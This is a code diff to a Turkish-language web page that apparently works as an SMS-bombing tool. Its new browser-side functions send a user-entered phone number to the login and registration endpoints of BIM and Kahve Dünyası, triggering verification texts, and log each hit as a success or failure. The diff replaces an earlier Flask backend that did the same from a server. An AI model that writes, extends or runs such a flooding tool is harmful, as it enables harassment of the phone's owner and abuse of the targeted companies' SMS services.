@@ -9,34 +9,14 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #0b0c0e;
-        }
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #16181c;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #2c3036;
-            border-radius: 10px;
-        }
-        .fade-in {
-            animation: fadeIn 0.6s ease-out forwards;
-        }
-        .slide-up {
-            animation: slideUp 0.4s ease-out forwards;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.98); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        body { font-family: 'Inter', sans-serif; background-color: #0b0c0e; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #16181c; }
+        ::-webkit-scrollbar-thumb { background: #2c3036; border-radius: 10px; }
+        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
+        .slide-up { animation: slideUp 0.4s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body class="text-zinc-200 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">
@@ -81,11 +61,54 @@
     </div>
 
     <script>
-        function startProcess() {
+        let isRunning = false;
+
+        function logMessage(msg, type) {
+            const logConsole = document.getElementById("logConsole");
+            const logRow = document.createElement("div");
+            logRow.className = "slide-up text-xs font-mono py-1 px-2.5 rounded-md flex items-center justify-between transition-all duration-300";
+            
+            if (type === "success") {
+                logRow.className += " bg-zinc-900/40 text-emerald-400 border-l-2 border-emerald-500";
+            } else {
+                logRow.className += " bg-zinc-950/20 text-rose-500 border-l-2 border-rose-800";
+            }
+            
+            logRow.innerText = msg;
+            logConsole.appendChild(logRow);
+            logConsole.scrollTo({ top: logConsole.scrollHeight, behavior: 'smooth' });
+        }
+
+        // --- TARAYICI TABANLI API İSTEKLERİ ---
+        async function sendBim(phone) {
+            try {
+                let r = await fetch("https://bim.veesk.net/service/v1.0/account/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone: phone })
+                });
+                if(r.status === 200) logMessage(`Başarılı! ${phone} --> bim`, "success");
+                else throw new Error();
+            } catch { logMessage(`Başarısız! ${phone} --> bim`, "fail"); }
+        }
+
+        async function sendKahveDunyasi(phone) {
+            try {
+                let r = await fetch("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ countryCode: "90", phoneNumber: phone })
+                });
+                let json = await r.json();
+                if(json.processStatus === "Success") logMessage(`Başarılı! ${phone} --> kahvedunyasi`, "success");
+                else throw new Error();
+            } catch { logMessage(`Başarısız! ${phone} --> kahvedunyasi`, "fail"); }
+        }
+
+        async function startProcess() {
             const phoneInput = document.getElementById("phoneInput");
             const startBtn = document.getElementById("startBtn");
             const monitorArea = document.getElementById("monitorArea");
-            const logConsole = document.getElementById("logConsole");
             const loader = document.getElementById("loader");
 
             if (phoneInput.value.length !== 10) {
@@ -93,75 +116,24 @@
                 return;
             }
 
-            // Arayüz kilitleme ve hazırlık
+            phoneInput.disabled = true;
             startBtn.disabled = true;
             startBtn.classList.add("opacity-50", "cursor-not-allowed");
-            phoneInput.disabled = true;
-            logConsole.innerHTML = ""; 
             monitorArea.classList.remove("hidden");
-            loader.innerText = "İstekler gönderiliyor...";
 
-            // Python Flask API'ye tetikleyici gönderiyoruz
-            fetch("/api/start", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ phone: phoneInput.value })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.error) {
-                    alert(data.error);
-                    resetUI();
-                    return;
-                }
-                
-                // Flask sunucusundan canlı Server-Sent Events (SSE) yayınını dinle
-                const eventSource = new EventSource(`/api/stream/${data.task_id}`);
-                
-                eventSource.onmessage = function(event) {
-                    const logData = JSON.parse(event.data);
-                    
-                    if (logData.status === "ping") {
-                        return; // Bağlantı canlılık kontrolü pas geçilir
-                    }
+            const phone = phoneInput.value;
 
-                    if (logData.status === "done") {
-                        eventSource.close();
-                        loader.innerText = "Tamamlandı";
-                        loader.classList.remove("animate-pulse");
-                        loader.classList.add("text-emerald-400");
-                        resetUI();
-                    } else {
-                        const logRow = document.createElement("div");
-                        logRow.className = "slide-up text-xs font-mono py-1 px-2.5 rounded-md flex items-center justify-between transition-all duration-300";
-                        
-                        if (logData.status === "success") {
-                            logRow.className += " bg-zinc-900/40 text-emerald-400 border-l-2 border-emerald-500";
-                        } else {
-                            logRow.className += " bg-zinc-950/20 text-rose-500 border-l-2 border-rose-800";
-                        }
-                        
-                        logRow.innerText = logData.msg;
-                        logConsole.appendChild(logRow);
-                        
-                        // Otomatik Smooth Scroll aşağı kaydırma
-                        logConsole.scrollTo({
-                            top: logConsole.scrollHeight,
-                            behavior: 'smooth'
-                        });
-                    }
-                };
-            })
-            .catch(err => {
-                alert("Sistem hatası oluştu.");
-                resetUI();
-            });
-        }
+            // Sırayla istekleri tarayıcıdan gönderiyoruz
+            await sendBim(phone);
+            await sendKahveDunyasi(phone);
 
-        function resetUI() {
-            document.getElementById("startBtn").disabled = false;
-            document.getElementById("startBtn").classList.remove("opacity-50", "cursor-not-allowed");
-            document.getElementById("phoneInput").disabled = false;
+            // İşlem bittiğinde arayüzü güncelle
+            loader.innerText = "Tamamlandı";
+            loader.classList.remove("animate-pulse");
+            loader.classList.add("text-emerald-400");
+            startBtn.disabled = false;
+            startBtn.classList.remove("opacity-50", "cursor-not-allowed");
+            phoneInput.disabled = false;
         }
     </script>
 </body>
